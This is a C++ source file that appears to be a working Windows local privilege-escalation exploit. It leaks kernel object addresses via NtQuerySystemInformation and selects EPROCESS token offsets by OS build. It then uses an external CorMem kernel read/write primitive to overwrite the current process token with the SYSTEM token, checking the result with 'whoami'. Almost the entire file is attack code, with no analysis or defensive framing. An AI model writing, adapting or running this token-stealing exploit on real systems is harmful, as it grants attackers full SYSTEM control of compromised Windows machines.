#include "CorMem.h"
#include <winternl.h>
#include <stdint.h>
#include <iostream>

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define SystemHandleInformation			0x10
#define SystemHandleInformationSize		0x400000
#define STATUS_SUCCESS 0

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT	UniqueProcessId;
	USHORT	CreatorBackTraceIndex;
	UCHAR	ObjectTypeIndex;
	UCHAR	HandleAttributes;
	USHORT	HandleValue;
	PVOID	Object;
	ULONG	GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;


typedef 
NTSTATUS(__stdcall* pfnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS, 
	PVOID, 
	ULONG, 
	PULONG);
pfnNtQuerySystemInformation pNtQuerySystemInformation;

typedef NTSTATUS(WINAPI* pRtlGetVersion)(PRTL_OSVERSIONINFOW);


static
int 
InitFunc()
{
	HMODULE hModule = GetModuleHandle(L"ntdll.dll");

	if (hModule)
	{
		pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
		if (!pNtQuerySystemInformation)
		{
			printf("[-] NtQuerySystemInformation not loaded\n");
			return 1;
		}
	}

	return 0;
}

static
int
GetObjectPtr(
	PULONG64 ppObjAddr,
	ULONG ulPid,
	HANDLE handle)
{
	int Ret = -1;
	PSYSTEM_HANDLE_INFORMATION pHandleInfo = 0;
	ULONG ulBytes = 0;
	NTSTATUS Status = STATUS_SUCCESS;

	while ((Status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == 0xC0000004L)
	{
		if (pHandleInfo != NULL)
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, (size_t)2 * ulBytes);
		}
		else
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (size_t)2 * ulBytes);
		}
	}

	if (Status != NULL)
	{
		Ret = Status;
		goto done;
	}

	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
	{
		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == static_cast<USHORT>(HandleToULong(handle))))
		{
			*ppObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
			Ret = 0;
			break;
		}
	}

done:

	if (pHandleInfo)
	{
		HeapFree(GetProcessHeap(), 0, pHandleInfo);
	}


	return Ret;
}

DWORD GetWindowsBuildNumber()
{
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtdll)
	{
		return 0;
	}

	pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
	if (!RtlGetVersion)
	{
		std::cout << "[-] Failed to get RtlGetVersion address. Error code: " << GetLastError() << std::endl;
		return 0;
	}

	RTL_OSVERSIONINFOW osvi = { 0 };
	osvi.dwOSVersionInfoSize = sizeof(osvi);

	if (NT_SUCCESS(RtlGetVersion(&osvi)))
	{
		std::cout << "[+] Windows Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion 
			<< " Build: " << osvi.dwBuildNumber << std::endl;
		return osvi.dwBuildNumber;
	}
	return 0;
}


int main()
{
	DWORD EPROCESS_TOKEN_OFFSET = 0;
	DWORD buildNumber = GetWindowsBuildNumber();
	if (buildNumber >= 26100)
	{
		EPROCESS_TOKEN_OFFSET = 0x248;
	}
	else if (buildNumber >= 19041)
	{
		EPROCESS_TOKEN_OFFSET = 0x4B8;
	}
	else if (buildNumber >= 18362)
	{
		EPROCESS_TOKEN_OFFSET = 0x360;
	}
	else if (buildNumber >= 14393)
	{
		EPROCESS_TOKEN_OFFSET = 0x358;
	}
	else
	{
		return -1;
	}

	if (InitFunc() != 0)
	{
		std::cout << "[-] Failed to load NtQuerySystemInformation" << std::endl;
		return 1;
	}

	ULONG64 SystemProcess{ 0 };
	ULONG64 CurrentProcess{ 0 };

	//EnablePrivilege(SE_DEBUG_NAME);

	auto nResult = GetObjectPtr(&SystemProcess, 4, ULongToHandle(4));
	if (nResult != 0)
	{
		std::cout << "[-] GetObjectPtr failed for system process with error code: " << nResult << std::endl;
		return nResult;
	}

	
	auto hCurrentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	if (!hCurrentProcess)
	{
		std::cout << "[-] Failed to open current process. Error code: " << GetLastError() << std::endl;
	}
	nResult = GetObjectPtr(&CurrentProcess, GetCurrentProcessId(), hCurrentProcess);
	if (nResult != 0)
	{
		std::cout << "[-] GetObjectPtr failed for current process with error code: " << nResult << std::endl;
		return nResult;
	}

	system("whoami");
	std::cout << "Start Fxxking System" << std::endl;

	CorMem corMem{};

	ULONG64 systemToken = 0;
	if (!corMem.KernelRead((PVOID)(SystemProcess + EPROCESS_TOKEN_OFFSET), &systemToken, sizeof(systemToken)))
	{
		std::cout << "[-] KernelRead System Token 失败" << std::endl;
		return 1;
	}

	if (!corMem.KernelWrite(reinterpret_cast<PVOID>(CurrentProcess + EPROCESS_TOKEN_OFFSET),
							&systemToken,
							sizeof(ULONG64)))
	{
		std::cout << "[-] KernelWrite Current Token 失败" << std::endl;
		return 1;
	}


	system("whoami");
	system("pause");
	return 0;
}